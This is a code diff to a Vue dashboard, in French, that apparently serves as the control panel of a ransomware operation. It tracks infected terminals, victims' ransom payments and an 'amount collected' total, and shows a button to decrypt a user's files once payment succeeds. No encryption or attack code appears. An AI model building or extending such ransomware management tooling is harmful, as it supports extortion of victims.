@@ -8,19 +8,21 @@
 
             <div v-else>
                 <div class="card paragraphe">
-                    <div>
-                        <p class="text-center medium">
-                            Terminaux&nbsp;infectés&nbsp;
-                        </p>
-                        <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
-                        <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
-                    </div>
-                    <div>
-                        <p class="text-center medium">
-                            Sous-sous dans les po-poches
-                        </p>
-                        <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
-                        <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
+                    <div class="grid">
+                        <div>
+                            <p class="text-center medium">
+                                Terminaux&nbsp;infectés&nbsp;
+                            </p>
+                            <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
+                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
+                        </div>
+                        <div>
+                            <p class="text-center medium">
+                                Sous-sous dans les po-poches
+                            </p>
+                            <h2 class="text-danger text-center large">{{ totalAmount }} €</h2>
+                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
+                        </div>
                     </div>
                 </div>
                 <div class="grid">
@@ -55,7 +57,7 @@
                                     <p v-if="log.paymentStatus === 'payment_success'">
                                         <button class="action-button btn-small dashboard medium">Décrypter les fichiers de l'utilisateur</button>
                                     </p>
-                                    <p v-if="log.paymentStatus === 'files_decrypted'" class="flash-success btn-small dashboard medium">Transaction terminée</p>
+                                    <p v-if="log.paymentStatus === 'files_decrypted'" class="flash flash--success btn-small dashboard medium">Transaction terminée</p>
                                 </td>
                             </tr>
                         </table>
@@ -85,6 +87,7 @@ export default defineComponent({
             infectedFiles: [],
             payments: [],
             infectedTerminals: 0,
+            totalAmount: 0,
             moment: moment
         }
     },
@@ -94,12 +97,13 @@ export default defineComponent({
     },
     methods: {
         call(token: string | null): void {
-            HttpRequest.get('/logs', token)
+            HttpRequest.get('/api/logs', token)
                 .then((response: any) => {
                     console.log(response.data)
                     this.payments = response.data.transactions
                     this.infectedFiles = response.data.logs
                     this.infectedTerminals = response.data.infectedTerminals
+                    this.totalAmount = response.data.totalAmount
                     if([400, 404].includes(response.data.status_code)) {
                         this.$router.push('/*')
                     }
